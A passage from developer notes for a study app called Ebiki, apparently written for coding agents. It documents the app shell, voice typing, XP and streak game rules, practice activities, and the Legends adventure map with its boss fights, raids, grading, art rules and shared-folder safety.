  imports of App internals (`App`, `components/`, `shell/`, `dev/`; listed exceptions in the test).
- **Heavy screens load ON DEMAND** (`lazyComponent(loader, { prefetchMs })`, registry.jsx: still a plain function for
  the slot contract, own Suspense, renders direct once loaded, a null `Comp` after Fast Refresh falls back to
  Suspense): Legends, raid run/hero, asset view, Ebi Call, Roleplay, Scenes, Listen & Speak, Leech Doctor; feature ids
  live in small `featureId.js` files. App lazy-loads SettingsModal/OnboardingWizard/ModeStudio the same way.
- **`useActivityBusy(true)` also holds celebrations** (game `celebrateWait`: shown only after 1.5s free), so the streak
  modal never covers a raid, quiz or activity.
- **AI errors: ONE classifier** (`kit/aiError.js`: `aiErrorInfo`/`describeAiError`/`aiErrorText`, `ctxErrorText`);
  features call `ctx.ai.errorText(e)`, never show `API 500: {...}`.

### App shell (`src/shell/`)
Sidebar (`CORE_NAV` + feature `navItems`) | screen | rail (`railCards`, only on `railWanted` screens or `rail: true`).
Breakpoints in `SHELL` (CSS px after the body zoom; `collapseBelow`, `railHideBelow`). Overlay wrappers are
`display: contents`. The rail collapses to a strip (`platform.kv('ebiki-rail-collapsed')`). Sidebar icons are SVGs
(`public/assets/nav/<art>.svg`, `art` field; emoji `icon` is the fallback). A saved `activeTab` that no longer exists
falls back to Study. **Phones** (below `SHELL.phoneBelow`, `isPhoneWidth`): the Sidebar becomes a BOTTOM bar
(`SHELL.barHeight`, flips its parent to `column-reverse` itself); toasts and docks sit above it. A keyboard pick moves
focus into `<main>` (mouse, first load and Back don't).
**Core screens use the shared Duolingo-style classes** (App.jsx global `<style>`): `.duo-title`, `.duo-bubble`,
`.duo-cta` (+ `.green`, pair with `btn-press`), `.duo-tile` (+ `.brand`). Tiles in a flex column WRAP
(`flex: 1 1 170px; minWidth: 0`), never an auto-fit grid (its min-content width pushed Chat's Send off screen).

### Voice typing (`src/features/voice/`)
Mic badge on the focused text field; Alt+V toggles, Esc cancels. Speech goes through `listen` (`src/speech/`,
`pickStt`: cheapest available engine; the browser recognizer only in a tab, Electron's always fails). Text goes in via
`execCommand('insertText')` first (keeps Ctrl+Z history; React sees the input event), the native value setter only as a
checked fallback (`voiceText.js` plans the insert). Alt+V also matches the physical key (`e.code`: Mac "√", Cyrillic).
The recognizer reports failure (`onFail`), so refused mic permission ends at once. A transcript lands in its ORIGINAL
field without stealing focus back. Never on secrets: key fields carry `data-no-voice`. The badge portals into
`#ebiki-voice-layer` under `<html>`.

### Game (`src/features/game/`): XP, goal, streak, freezes, quests, league, friends
- **Only raw counters are stored** (`players/<id>.json` in the DATA folder, `days[date][machineId]`); everything shown
  is DERIVED (`engine.js`, pure, tested). `mergePlayers` (server, every write) takes the MAX per machine per counter,
  so computers on one share never lose or double count.
- `player.json` in the APP folder = this computer's `{machineId, playerId}` (`/api/player-local`, not guarded). Several
  players and none picked → "Who is studying?" chooser.
- Streak: any XP keeps the day. Freezes: start 1, all of today's quests earn one (max 2), a missed day spends one.
  Quests: "earn XP" + 2 seeded picks; a quest needing a feature (`mistake-gym`, `legends`, `ebi-call`) appears only
  when it is installed. A quest type this build doesn't know (newer computer on the share) counts as DONE and is
  hidden (`questsAllDone`; a day of only unknown quests earns no freeze). Adding a rest date past the cap drops dates
  that cover nothing first (`addRestDate`), never one covering a gap.
- League: race your own past 4 weeks (ghosts); friends = other players in the folder, never affect your tier. Saves
  send only the last 14 days.
- The Stats tab's streak is ANKI's review streak; the game streak is Ebiki activity.

### Practice activities, speech and the shared kit
- **`practiceHero`** (`{id, order, activity, Component}`): the Practice hub shows the lowest-order hero above the
  tiles and hides that tile (Daily raid: `legends/RaidHero.jsx`, state in `heroState.js`, read-only). **Never give a
  .js and a .jsx the same name ignoring case** (Windows resolved `./RaidHero` to `raidHero.js`). Sidebar flyouts
  (`NavFlyout`) need `nav_desc_<id>` / `descKey` (tested).
- **Slots**: `practiceActivities` (Screen gets `{ onExit, params }`), `chatMenuItems`. **Intents**:
  `ctx.open(navId, payload)` + `useIntent`. Features never import each other; shared code lives in
  `src/features/kit/`.
- **Optional features** (`optional: true`, off until Settings > General > Optional features: they spend speech on
  the user's key): `voice-chat` (`voiceChatOn(ctx)`), `listen-speak`, `scenes`.
- **Speech** (`src/speech/`): `listen(ctx)` / `speak(ctx, text, {lang, voice})`, cheapest engine first. QuizRunner
  questions can carry `audio: {text, lang}` (heard, not shown) and `speak: true`.
- **Roleplay**: Ebi plays the OTHER part; scorecard axes differ for language vs other subjects. **Scenes**:
  `kit/scene.js` (reusable by Legends).
- **Practice log** (`kit/practiceLog.js` + `practiceLogStore.js`): activities `recordPractice(ctx, src, entries)`;
  `pickCardItems` and Ebi Call rank cards practiced elsewhere in the last 2 days LAST (`rankFresh`); topic prompts get
  `recentTopics`. Mistake Gym rotates (`practicedAt`, 12h rest). **Study reviews are never filtered by it** (skipping
  a due card breaks spacing).
- **Rule cards** (`kit/ruleCard.js` + `RuleCardButton`): a mistake becomes a card for the RULE behind it (role
  `deck`, editable preview; the model skips one-offs). Used across Mistake Gym (`subject.grammarSlipList`,
  `QuizRunner feedbackExtra`).
- **`sanitizeQuestions` (kit/grade.js) is the funnel for model questions**: an `answer` index sent as the string "2"
  is read as the index (unless a choice IS that number; read as text the question was dropped), and its `clean` option
  cleans choices and accepted answers (they reach the screen). Pass `clean: ai.clean`.
- **Translations are tested** (`src/features/i18n-coverage.test.js`: `t('key')`, `tCount(t, 'key')`, `*Key: 'key'`
  anywhere in `src/`). It can't see template keys or prefixes (`t('tab_' + id)`): those families are checked against
  their real id lists in `src/i18n/templateKeys.test.js`; a NEW template family goes there.

### Legends (`src/features/legends/`): the adventure map per mode
Works for ANY subject (a CompTIA map teaches CompTIA). Sidebar screen `legends` (order 15, no rail), rail card
`LevelCard` (Study home, Stats). Discover can use the level (opt-in).
- **Pure, tested**: `map.js` (`normalizeMap` recomputes every status from what is DONE: areas open in order, steps one
  by one, optional Talk steps never block, boss last; `applyNodeResult` stars/passes and FREEZES the area;
  `needsDetail`/`applyAreaDetail` = lazy detail of `LOOKAHEAD` areas; `mergeEdit` keeps started/finished areas
  exactly, takes the proposal for the rest), `placement.js` (batches of 5 per tier, climb on 80%, 10 to 30 questions,
  `placementLevel`), `prompt.js` (every prompt + parser).
- **Storage**: `store.js` = `featureStore('legends')`, key `map-<modeId>`, serialized `updateMap(modeId, fn)`, never
  writes after a failed read; async writers pass the mode id pinned when they STARTED. Start over writes null.
- **Levels from evidence** (the owner: with enough context about the learner, use it instead of the test).
  `kit/evidence.js` (pure, tested) turns the LEARNER CONTEXT snapshot into points and an `enough` verdict (`EVIDENCE`:
  40 points, or 15 when the deck shows 30+ NEW cards as scope, giving a CAUTIOUS level, confidence capped 0.45, else
  0.7). New cards are scope only, never points. An unreadable deck is `deckFailed`/`deckUnreachable`; the rest still
  counts. `kit/evidenceJudge.js` runs it. Used by:
  - Start tile **"Use what Ebiki knows"** (Questionnaire + `knownReason.js`): offered whenever the mode has anything;
    the click re-reads everything (`fresh`); too little says what is missing, a closed Anki is named with what else
    was used. Re-reads when `ankiConnected` turns true and on "Check again" (one read at open, before Anki answered,
    showed every failure as "is Anki open?"). Path `known`, `map.start.placement.from = 'evidence'`; thin falls back
    to the resume screen with the reason and the test.
  - The **learner feature** (`features/learner/`) owns level NUDGES (study cards batched per burst, `STUDY_FLUSH_MS`)
    and seeds a level for a mode with none once evidence is enough (one silent AI call per mode per session, active
    mode only, no LEVEL_UP; its `Mount` also tries when a mode becomes active with Anki connected). Unapplied batches
    sit in `localStorage('ebiki-learner-pending')` PER PAGE (owner + `seenAt`; another tab's adopted only after 60s of
    silence), flushed on page hide. Evidence uses the mode deck or the first deck.
  A damaged `features/<id>/<key>.json` is retried after 1s, then kept as `.corrupt-<stamp>` and read as empty. The
  level reaches Study question generation (`levelBlock`, wording only), Chat (no manual level set), Mistake Gym, Listen
  & Speak, Scenes, Roleplay, Ebi Call, Legends and Help.
- **Practice wrong answers reach the Mistake Gym**: `EVENTS.PRACTICE_MISSED { source, mode, misses }` from Ebi Call,
  Legends steps (`res.misses`), Scenes, Listen & Speak (`missesFromResults`, kit/grade.js); never the gym's own
  workouts. Study cards made from Legends items move the item's tally (`tallyStudiedCard`, only with the map cached,
  never gold). Legends steps log items in the practice log. Roleplay strengths go into the level's "strong at".
- **Learner level is in the KIT** (`kit/learner.js`, `kit/learnerStore.js`, store `features/learner/level-<modeId>`)
  so features read it without importing Legends (`level: await learnerLevelLine(ctx)`). 0..130 plus a band (A1..C2
  for languages, Beginner..Expert otherwise; `lg_band_*`). Set by placement (or "I'm new"); nudged by
  `deltaFor(source, total, correct)` from Legends results, CARD_GRADED and PRACTICE_DONE. Only an EXISTING level
  moves. `LEVEL_UP` fires once per whole level above `peak`, never on a re-climb.
- **Generation** (`generate.js`, one run per task via `once`): plan (role general) → detail (role deck: items become
  cards) → quiz per step (role study, `adaptiveSplit`: new or weak items as multiple choice).
- **An area is `LESSONS` (8) levels, then Weak spots, then the boss** (Learn + Practice over the same items read as one
  level twice). Each level teaches `PER_LESSON` (2 to 3) NEW items and quizzes them (`QUIZ_SIZE.learn` 10, plus up to
  `QUIZ_REVIEW_ITEMS` earlier items, shakiest first). `parseAreaDetail` enforces it: 'practice' nodes dropped, an item
  taught by ONE level, untaught items get their own level. Story levels teach first too (`TEACH_KINDS`).
- **Missed questions come back once at the end** (`QuizRunner retryMisses`; not in fights), never changing the score
  (`_retry`, ignored by NodeRun's `record`).
- **Weak spots** (kind `weak`, optional, opens with the boss, never blocks it; `ensureWeakNodes` adds it to older
  maps): 10 questions over `weakItems(area)`. Clearing it ONCE sets `area.bonusLife` (`lg_bonusLife`): one more allowed
  boss miss (`bossOdds(total, {bonus})`; `forgivenMisses` → result `forgiven`, counted right by `applyNodeResult`,
  boss only, capped). A replay never adds another; the cheat path pays it too.
- **The boss is always 20 questions, written FRESH every attempt** (`FRESH_KINDS`: never a saved set; the step file
  keeps only `history`, fed back as `avoid`), pushed to the limit but never unfair.
- **Legendary** (a cleared area's challenge, `{kind: 'legendary'}`, not a map node): 20 fresh typed questions, 90% to
  win (`PASS.legendary`), no bonus life; `applyLegendaryResult` marks `area.legendary` (🏅).
- **The question KIND keeps the screen's promise** (`fitQuestionsToKind`, prompt.js, inside `makeQuizNow`'s ask, before
  the taught-items filter): legendary drops choice-only questions and strips choices; boss and raid convert a
  choice-only question to typed (choices become its `alt`) or DROP it when it can't stand without options ("which of
  these", true/false, all/none of the above, any of 4 languages) or gives itself away; top-up refills. So "no safe
  strikes" after the enrage holds. A stricter retry MERGES with the first ask (`mergeQuestionSets`), never replaces it.
- **Quizzes ask ONLY about what the step taught.** `buildQuizPrompt` sends the items' text as the one source, the
  knowledge base only as background, at most `QUIZ_PER_ITEM_MAX` per item. `makeQuiz` drops questions whose `target`
  is not a taught item (`itemIdFor`) and asks once more (`strict`) under `QUIZ_MIN_KEPT`. The mode DESCRIPTION (the
  learner's own context) IS visible to quizzes, grader and raids and may shape situations: personalization, not
  hallucination (the owner had hiding it reverted). A REVIEW PASS (`buildQuizCheckPrompt`/`parseQuizCheck`, role
  study) drops questions with a second defensible option, a missing accepted answer, a wrong key or untaught content;
  fail-soft. Saved sets carry `checked: QUIZ_CHECK_VERSION` ONLY when every review really ran (`reviewed` in
  `makeQuiz`; a failed one left it stamped and never looked at); an unstamped set is reviewed ONCE on its next visit.
  **A shrunk set is TOPPED UP** (`QUIZ_TOPUP_BELOW`, under 85%: one more call for exactly the missing count, avoiding
  kept prompts, reviewed too); old sets refill the same way.
  **🔄 New questions is for everyone, not a cheat** (`NewQuestionsButton`, NodeRun: lesson, scene, boss entrance,
  running quiz (asks first once answers exist, nothing recorded), result). `newQuestions` = `clearStep` + reopen with
  `try + 1`.
- **Bosses have names** (`boss` in the area-detail JSON, `bossLine`, user's language → `area.bossName`; older areas get
  one via `ensureBossName`, role help, once; `setBossName` fills only a missing name, frozen areas too). Shown on the
  entrance (`lg_bossNamed` + `lg_bossGuards`), arena, quiz title, map. The result lists EVERY answer (`AllAnswers`).
- **Art is hand-made FILES, never generated** (`public/assets/legends/areas|bosses/<motif>.svg`, one per `MOTIFS`
  entry; the AI only picks motif and palette). `art.jsx` fetches once, sanitizes with `sanitizeHtml` (loaded LAZILY:
  Markdown.jsx needs a DOM; a top-level import broke `features.test.js`) and inlines it. **Each drawing has its OWN
  fixed colors** (palette `original`, first in `PALETTES`); a palette recolors only ONE part per boss via
  `--lg-tint`/`-hi`/`-lo` with fallbacks (the owner: whole-boss repaints made some unrecognizable). `art.test.js`
  fails on the retired `--lg-sky/far/near/deep/accent/light`, a file with no tinted part, a `var()` without fallback,
  a missing motif file, scripts/links/url(). A new motif = `MOTIFS` entry + both files + `ENTRANCES` entry. How to
  edit: `public/assets/legends/README.md`. Palette CSS: `src/config/palette.js` (`PALETTE_CSS`, App + gallery).
- **Making or redrawing Legends art (boss, RAID boss, banner) or a raid boss voice/lore? Read
  `docs/legends-art-guide.md` FIRST and follow it** (a raid boss also: "The owner's vision for the FIGHT" in
  `docs/raid-bosses-plan.md`: nine unique impact moments, a dramatic themed knockout, fair profile, the checklist) (owner's top rules, boss recipe, mood rules, raid boss voices,
  approved/rejected list; `raids/kitsune.svg` is the gold standard). Hard rules: every new or redrawn asset gets the
  guide's TRIPLE CHECK (each alone, the set side by side, real app screens + tests + check-art) before the owner sees
  it; every boss and banner truly unique (not a recolor), each banner its boss's lair with the boss present; each
  boss its OWN entrance MOVEMENT (`ENTRANCES`, optional pivot `origin`); everything has idle life.
  `dev/legends-gallery/catalog.js` is the one motif list (a test keeps it equal to `MOTIFS`); the owner reviews all art
  at `/dev/legends-gallery/` (dev server only).
- **SVG motion rules**: `<animateTransform>`/`<animateMotion>` only (the sanitizer drops `<animate>`/`<set>`/
  `calcMode`); `keyTimes` must match `values` one to one and end at 1, or the browser silently drops it (tested).
  Tag `class="lg-in"` (entrance) or `lg-loop` (idle); `withMotion` strips per `animated` mode ('intro' card, 'idle'
  arena/banners, still on map icons, locked areas, reduced motion), so the file's own attributes must be the finished
  pose. Card motion per motif = `ENTRANCES` (BossArena.jsx keyframes, landing at `ENTRANCE.impact`). No `url()`, so no
  gradients: depth is layered opacity. Render in headless Chrome (light + dark, a few entrance moments) and look
  before committing.
- **Step content is made ONCE and saved** (`readStep`/`saveStep`, `features/legends/step-<hash>.json` keyed by mode +
  area + node, `sig` = the step's items): revisits reuse it (`reshuffleQuiz`), scenes too (`sceneFor`); a changed area
  no longer matches `sig`. New sets get the area's other steps' questions as `avoid`, exact repeats dropped (`normQ`).
  Talk steps are always live.
- **Talk steps**: Ebi plays the step's scene (`buildTalkSystem` `scene` = node title) and never re-asks what the
  learner said. **💡 Hint** (`buildTalkHintPrompt`, role `help`): ONE sentence in the user's language saying WHAT to
  say, never the learned-language words; `hintGivesAway` rejects one quoting a practice phrase (retry once, then
  `lg_hintFallback`); hints used go to the score prompt.
- **Ebi's words are tappable like Study** (`ctx.words.tappable(text, source)` + `ctx.words.popup(source)`): Talk
  messages, Scene lines (replay is a separate 🔊 button). Sources unique per chat/story (`sid`); only 'question'/'hint'
  are guarded as a live answer. Language modes only.
- **Fight settings + Study formatting in every quiz** (owner: the user may want full immersion).
  `legends/FightSettings.jsx` = one collapsible row under a raid/boss/Legendary intro (deck, learned language, "Ebi
  speaks", word hints, grammar feedback, strict accents, Learn it, answer style). Values ARE the mode's studyRules
  (one setting with Study) via `ctx.study.rules()`/`ctx.study.setRules(patch)` (`updateModeById`); shaping in
  `kit/fightSettings.js`. `fightCtx(ctx)` gives the fight a subject whose `userLang` is "Ebi speaks" ('' = app
  language) plus `phrasing` (FULL IMMERSION when it equals the learned language; a general mode keeps terms
  untranslated, grades understanding in any language), so EVERY fight prompt follows without knowing. Changing
  learned language / Ebi speaks / dialect on the intro rewrites the questions (`generationKey`). Grammar feedback off:
  grammar outside the tested word never makes a strike glancing. Raid questions get Study's cue (`ensureLetterCue`
  adds a skeleton when missing).
  **`ctx.words.tappable(text, source, sentence, opts)`** (`opts` = { answers, glosses, lang }) = Study's question
  formatting for any text (muted cues, word-hint slot, answer words untappable), tappable when `tapAllowed` (language
  mode, or text not in the app language). `src/utils/tapTokens.js` is the ONE tap tokenizer (Intl.Segmenter,
  per-character Han/kana fallback). `answers` guards the LIVE question (`questionAnswersOf`: accepted + correct choice
  + alt's): a revealing lookup shows `lookup_wouldReveal`, never cached; pass [] once the answer shows. Also
  `ctx.words.canTap(lang)`, `ctx.words.glosses(text, { answers })`. QuizRunner uses them for question, choices (a word
  tap never picks the tile), hint, answer, note, explanation, each its own source; `startChoices(q)` opens a dual
  question on its choices. Taunts, raid debrief, all-answers list and Learn-it panel are tappable too. General-mode
  lookups explain in the app language, no card or hook.
- **The boss is a fight** (`BossArena.jsx`): entrance (`BossIntro`, timings in `ENTRANCE`; static under reduced
  motion), then a health bar = right answers needed (`bossOdds`: `PASS.boss`) and LIVES = misses allowed + 1 (no rule
  text). `bossOutcome` ends at 0 health (win) or 0 lives (unasked questions count missed: `finish(total)`); tested that
  losing every life never passes and emptying the bar always does. `applyNodeResult` still decides the pass.
- **Adding cards needs the MODE's deck** (`subject.modeDeck`, never the fallback `subject.deck`): a `DeckPicker` beside
  the add buttons saves it (`ctx.cards.setModeDeck` = `setAnkiDeck`; `ctx.cards.decks`).
- **Mount flags are SET on mount, not only cleared**
  (`useEffect(() => { alive.current = true; return () => { alive.current = false } }, [])`): StrictMode mounts twice,
  and a cleanup-only flag paired with a run-once guard (`opened`/`ran`) dropped the only answer (Talk stuck on "Ebi is
  thinking"). Never pair a one-shot guard with a cleanup-only flag.
- **`/features/` (data folder) is GITIGNORED**: maps, saved questions, levels, practice log are personal.
- **Cheat mode (hidden, testing)**: 7 quick clicks on the map title OR the Legends heading in Settings > General (reachable with no key and no map: the asset view must be showable on a fresh install; `useCheatToggle`, `CheatUI.jsx`) flip
  `features.legends.cheats`; ⚡ buttons complete/reset/unlock/regenerate areas and steps (`cheats.js`), open locked
  steps (a win records via `cheatCompleteNode`), set the level (`updateLearner(..., { quiet: true })`: no LEVEL_UP XP),
  retake placement; "Win now"/"Fail now" finish a step through the NORMAL path (rewards included). Map cheats pay
  nothing. `CheatSettingsCard` (Settings > General) shows only while on. `ctx.prompt` (= `promptDialog`) exists for it.
- **Screens**: `LegendsScreen` orchestrates; `Questionnaire`, `PlacementExam` (NOT `Placement.jsx`: Windows resolved
  `./Placement` to `placement.js`), `MapView` (centers the next step inside the screen's scroll box; `scrollIntoView`
  also scrolled the page root), `NodeRun` (everything quiz-like via `QuizRunner`), `Talk`, `EditPanel` (Accept
  re-merges over the LIVE map). A mode switch keeps the previous screen (same element objects, nothing remounts) while
  the new map loads (`held`), showing `lg_loading` only after `HOLD_MS`; a failed read shows the retry screen.
- **Shared-folder safety**: `updateMap` and `updateLearner` READ AGAIN before every write (`ensure(key, { fresh: true
  })`), else a stale copy overwrote another computer's map or level. The level is cached only after its write
  succeeds. A map this build cannot shape (newer `MAP_VERSION`, damaged) is a FAILED read, never "no map" (a new plan
  was written over it). `shapeMap` collapses duplicate areas from a merge (`dedupeAreas`: the more finished copy).
  Area detail lands only while the area keeps its title/theme (Change my map can repurpose the id mid-call).
- **One-time rewards live OUTSIDE the map** (`claimReward(modeId, rewardKeyFor(kind, title))`, key `rewards-<mode>`):
  placement XP and each boss's first win (by island title) pay once per mode, even after Start over. Failed tries and
  Blitz pay `legendsTry` (5 XP, `LEGENDS_TRY_XP_CAP` 6 a day).

- **Guards**: `finishingRef` (a double "See the result" recorded and paid twice), `modeIdRef` (a result after a mode
  switch shows nothing), Help's map edit waits in `pendingEdit` until a map exists and nothing in `BUSY_VIEWS` runs, a
  raid left by navigation saves on unmount, card XP only for cards Anki recorded, one hint scroll per question, Blitz
  claims answers and finish with refs, QuizRunner ignores a judge reply after ✕ (`exited`), `itemIdFor` needs 3+
  characters for a partial match, `addItemsToDeck` remembers this session's adds (`addedNow`) when the map save fails.
- **Cards only on a click** (`deck.js`, `ctx.cards.addNew`, tags `ebiki legends lg-<area>`); a beaten boss offers the
  whole area.
- **Rewards** (game): PRACTICE_DONE `legends` (quest counter, paid via `LEGENDS_STEP`: 20 XP + 5 per area up the map,
  cap 6), `legends-try` (generic practice XP), `legends-placement`; `BOSS_BEATEN` (first win of an area only) = 50 XP +
  a streak freeze (`bossWins`, `computeStreak`, capped at `MAX_FREEZES`); `LEVEL_UP` = 10 XP per new whole level (cap 3
  per event). **XP rewards effort**: `LEGENDS_STEP` carries `effort` (`effortOf`: clean strikes most, choices least)
  and `replays` (`replayFactor`); `legendsXp` in game/engine.js.
- **Fights are strikes** (`fight.js`, pure, `fight.test.js`; boss, Legendary, raids). `judgeStrike` (kit/judge.js):
  CLEAN (tested thing and everything else right) deals 2; GLANCING (tested thing right, something else wrong) deals 1
  and its slip returns as an attack; MISS costs a life. A choice (the typed question's `alt`, "🛡 Show choices", phase 1
  only) is a SAFE strike of 1. Every 3rd clean strike in a row crits (+1); `weakTo` items (rule items first) +1. A
  missed question returns `ATTACK_GAP` questions later as a telegraphed ATTACK (blocked = counter 1, missed = 2 lives;
  max `MAX_ATTACKS`, never from an attack). Enrage at half health (no choices). A shield absorbs one life. The OUTCOME
  decides the pass (`fightStars`): questions running out with lives left is a win. Boss/Legendary questions are DUAL
  (`sanitizeQuestions(..., {dual})`).
- **Fight grading is FAST, then looked at again** (`kit/fightJudge.js`, `kit/judge.js`, `FightExtras.jsx`
  `useFightCheck`). Decisions (who is re-checked, appeal timing, debrief rows, question resolution, Learn-it items) live
  in `fightCheck.js` (pure, tested); the refund is ONE path, `refundRunningFight`. **Off switches in one place**:
  `FIGHT_EXTRAS` (`recheck`, `refund`, `appeal`, `learnIt`, `debrief`, `taunts`); taunts also follow the user setting
  via `fightExtrasFor`. Any subject: prompts branch on `isLanguage`.
  - A. `judgeStrike` blocks only on a VERDICT call (`VERDICT_MAX_TOKENS` 120) so damage lands at once; `later` brings
    the note (into the SAME answer's feedback, `verdictSeq`) and a glancing slip's fix. That attack enters as a
    `_pending` placeholder, skipped if its text is late (`resolveQuestion`). Local matches and choices stay instant; a
    failed verdict call is 'error' (ask again). **NO KEY is never a silent miss**: an unmatched answer is "could not
    check" (`kit_checkNoKey`: no heart, no Anki Again); non-fight quizzes SELF-GRADE (`selfGraded`, `kit_self*`). Each
    answer is claimed once synchronously (a failed check releases it). Grader flags read "sí"/"True."/"falso"
    (`flagOf`); `stripAccents` drops only Latin/Greek/Cyrillic accents + Arabic/Hebrew marks (か ≠ が, क ≠ का);
    `normalizeAnswer` is NFKC + trims CJK punctuation.
  - B. Every AI miss/glancing gets a background `recheckStrike`; it only RAISES a verdict. Overturned: `FightNotice`,
    and while the fight runs `refundFor` + `applyRefund` (`refund.test.js`) return the hearts (`strikeCost`) and deal
    the missing damage; `last.kind: 'refund'` (`refundN`) plays a sweat drop and heart flying back, never a hit; its
    attack is cancelled (`_attackOf`); ability state is not rewound. A decided fight is never refunded: a later win
    fixes only grade/tally (`afterFight`). Raids record progressively (`recordSoFar`, after `fc.settle()`, `SETTLE_MS`
    cap): an overturn changes a card's first answer before recording, or `srs.correctRating` once after. NodeRun's
    finish waits the same way.
  - C. **Appeal** (`MissTools`): optional reason, same careful judge, one per answer (a failed check may retry),
    disabled during the re-check; shows `why`; a win refunds like B.
  - D. **📖 Learn it** mid fight (no timers; modal has `data-top-overlay` so the quiz ignores keys):
    `kit/LearnItPanel.jsx` = card back / taught text, a hook from the ONE engine (`ctx.learn.makeHook`,
    `ctx.learn.savedHooks`), a short chat (`kit/learnIt.js`). Records no review.
  - E. **Debrief "What tripped you up"**: raids on the result (`Debrief`); Legends inside `AllAnswers`. Learn it, rule
    card, Appeal (after the fight a win fixes the Anki grade or `regradeItem`, never the outcome).
  - F. **Boss taunts** on a miss (`features.legends.taunts`, default on, off in focus mode): `kit/taunt.js` (pure:
    prompt, `parseTaunt`, overlap check `sharesPhrase`, `islandVoice`) + `kit/tauntStore.js` (role `help`; each boss's
    last `RECENT_MAX` lines per device in `platform.kv`, sent as "never repeat"; a reply sharing a 3+ word phrase (4
    chars CJK) is retried once, then NOTHING shown; the persona sample is a fallback only when the model failed, once
    per fight). Voices: `RAID_VOICES` (raidVoices.js); Legends bosses `islandVoice` + `RAID_VOICE_RULES`/`STOCK_WORDS`.
    `TauntBubble` under the arena; a line arriving after the next question is dropped; Help hears it (`boss-taunt`).
- **Accent grading is ONE setting** with Study's accent drill (`studyRules.accentDrill`; `subject.strictAccents`,
  `subject.setStrictAccents`), only for languages with accents: fights pass `strictAccents: !!subject.accents && ...`
  (a general mode graded "Quebec" for "Québec" glancing, with an accent attack). Relaxed: a slip counts clean unless it
  makes another word or form (`accentChangesWord`).
- **Codex** (`Extras.jsx`, `itemTier`/`areaCodex`): an area's items, new → bronze → silver → gold (gold needs Good+ in
  a fight); tiers are computed, so gold fades. Every Legends answer is graded by the shared rule (NodeRun `record`:
  `gradeFromStrike` in fights, else `gradeAnswer`; hint scroll = `hintUsed`) → `items[].grade`: Again = miss, Hard
  right but not toward gold (`bossRight` counts Good+), Good/Easy right. No `grade` (cheats, blitz) counts by
  `correct`. `tallyStudiedCard` takes Study's grade from `CARD_GRADED`. **Gold blitz**: timed local recall (no AI).
- **Area extras** (`parseAreaExtras`): `story` (tappable, until "Got it", `storySeen`), `canDo` (**passport**, stamped
  on clear), `bonus` (**chest**: one right recall opens it, `chestOpened`). One optional **Adventure** step per area
  (`goal` mission in Talk; Ebi ends with `GOAL_TAG`; `ADVENTURE_TURNS`).
- **Helpers** (`map.helpers`, max `HELPERS_MAX`, never bought): first flawless level = 📜 hint scroll (half of each word),
  first flawless Weak spots = 🛡 shield (next boss fight). **Nemesis rematch**: a lost boss stores missed items
  (`area.nemesis`); the next boss asks `NEMESIS_SHARE` % about them; a win clears it. **Journey heatmap** (`map.days`,
  `logDay`; layout `journeyCells`: one Monday-to-Sunday week per column). **First-miss nudge**: result offers first-time misses (`missNudged`) as cards once; off in Settings.
- **Focus mode** (`features.legends.focus`, questionnaire + `SettingsCard.jsx`): no entrance cinematic
  (`BossIntro calm`), floaters or combo flair; same rules.
- **Boss motion switches** (art.jsx): system reduce-motion stills every drawing ("no boss animates"). **Always animate
  the art** (`features.legends.motion`) overrides it; **Still bosses** (`features.legends.still`, the owner: fight
  without distraction) stills bosses, entrance, shake, flash and ability effects, and wins over `motion`. Keep it
  OBVIOUS: `MotionToggle` on the intro card and arena header, plus Settings. The asset view (`ArtMotion`) always
  animates. Read via `useArtMotionAlways` / `useArtStill`, never the settings directly.
- **Raids** (`raid.js` pure + `raid.test.js`/`siege.test.js`, `RaidRun.jsx`): DUE cards in Anki order
  (`nextRaidCards`: one per note, the run size per batch, never a note raided today, `day.asked`), one dual question
  per card (`buildRaidPrompt`), THREE phases.
  - **Each boss has a crafted PROFILE** (`raidProfiles.js`: `hp`, player `hearts`, flat daily `heal`;
    `bossHp`/`bossHearts`/`bossHeal` in raid.js), never health from the cards due. **No per-boss number lives anywhere
    else**: `raidProfile(motif, variant)` is the ONE resolver ({hp, hearts, heal, rules, k}: defaults → boss entry →
    `RAID_VARIANTS[variant]` → the boss's own `variants`; a layer value sets, `{mul}` or `{add}`). The fight carries
    it (`fight.tune`, `tuneFight`); the engine reads `rulesOf(fight)` (`FIGHT_RULES`, abilities/_rules.js) and hooks
    read `tuned(K, ctx)`, never the module K (`tuning.test.js`). A siege may store `variant` (absent = normal);
    `nightmare` is an unwired example. **The player's POWER numbers resolve the same way** (profile `powers`, defaults
    `POWER_DEFAULTS` in powers.js = the old constants: `window`, `sharpen`, `fury`, `momentumCrit`, `siphon`, `wind`,
    `steadfast`, `shield`, `bandage`, `loadoutMax`; floors `POWER_FLOORS`): a variant layer may weaken or strengthen
    them (`powers: { window: { add: -1 } }`). The engine reads `powersOf(fight)`; RaidRun, `siegeRule(powers)`
    (Help) and `powerVars(id, powers, damage)` (every `lg_pow*`/`lg_fx*` number) read the profile's. **Fairness is the owner's rule**: a
    bigger boss gets more hearts or an ability that protects the player; no boss needs near-perfect play.
    `profiles.test.js` simulates every boss with its own ability (65% beats each in a handful of runs, 60% beats all,
    later bosses take longer; `PROFILES=1` prints the table). Tune there, never by feel.
  - **Run size is a setting** (`features.legends.raidRunSize`, `RAID.runSizes`, `raidRunSize`; Fight settings on the
    raid intro + Settings > General > Legends), separate from health: it only decides how many runs a boss takes.
  - **A SIEGE**: wounds stay until the boss is beaten; lost hearts stay lost for the day; a run that loses EVERY heart makes the boss RALLY (heals back `RAID.rallyShare`, half, of that run's damage) and refills the hearts at once (no lockout; the owner: "why stop them?"). Each new local day the hearts
    are full again and the boss heals its profile `heal`, applied lazily per elapsed day, ONLY FORWARD (`regenSiege`,
    idempotent: two computers never heal twice). Stored
    `siege: {boss, hp, damage, hearts, date, bandage?}`; a siege saved by an older build keeps its health until beaten;
    `day.hp/damage` written in step for older builds; a state without `siege` restarts from `day` (`siegeOf`).
  - **Powers** (`powers.js`, raids ONLY). **Making or changing a power? Read `docs/raid-powers-guide.md` FIRST.**
    12 powers UNLOCKED FOR GOOD by DIFFERENT bosses beaten (`bossesBeaten`; 1 to 26, the last needs the whole roster;
    no bag, no drops). The player brings up to `LOADOUT_MAX` (3) chosen on the raid intro (`PowerLoadout`,
    `features.legends.raidLoadout`, `shapeLoadout`); EACH WORKS ONCE PER FIGHT, one per question. Window powers (Focus,
    Siphon, Momentum, Fury) last `POWER_WINDOW` raid questions (`powerAfterAnswer` counts down, names the `proc`);
    Ward only on an incoming attack; Steadfast is passive (extra hearts lost first, subtracted before the siege write);
    Bandage between runs, once a day (`applyBandage`). Effects go INTO `strike` (`opts.bonus/focus/momentum/fury/ward`,
